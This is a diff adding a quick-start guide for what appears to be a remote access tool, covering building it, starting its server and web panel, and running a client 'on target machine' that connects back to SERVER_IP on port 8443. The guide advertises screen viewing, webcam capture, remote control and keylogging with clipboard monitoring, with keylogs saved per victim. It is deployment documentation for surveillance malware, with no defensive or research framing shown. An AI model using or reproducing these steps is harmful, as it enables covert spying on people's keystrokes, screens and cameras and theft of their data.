@@ -1,0 +1,58 @@
+QUICK START GUIDE
+=================
+
+STEP 1: BUILD (if not already done)
+------------------------------------
+Windows: build_windows.bat
+Linux:   ./build_linux.sh
+macOS:   ./build_macos.sh
+
+STEP 2: START SERVER
+--------------------
+cd dist/server
+pip install -r requirements.txt
+python server.py --web --web-port 5000
+
+OR double-click: dist/server/run_server.bat (Windows)
+
+STEP 3: OPEN WEB INTERFACE
+---------------------------
+Open browser: http://localhost:5000
+
+STEP 4: START CLIENT
+---------------------
+On target machine:
+dist/client.exe --server-host SERVER_IP --server-port 8443
+
+OR create client_config.ini next to client.exe:
+[Server]
+host = YOUR_SERVER_IP
+port = 8443
+
+Then run: dist/client.exe
+
+THAT'S IT!
+----------
+✓ Client will appear in web interface
+✓ Click client name to view screen
+✓ Use Webcam/Control buttons as needed
+✓ Keylogs saved in: dist/server/keylogs/[ClientName]/
+
+PORTS:
+------
+8443 - Client connections (must be open in firewall)
+5000 - Web interface (default)
+
+FEATURES:
+---------
+✓ Real-time screen viewing
+✓ Multiple clients
+✓ Webcam capture
+✓ Remote control
+✓ Keylogging with clipboard monitoring
+✓ Client disable/enable
+
+For detailed instructions, see:
+- dist/README.txt
+- dist/server/SETUP.txt
+- BUILD_COMPLETE.txt
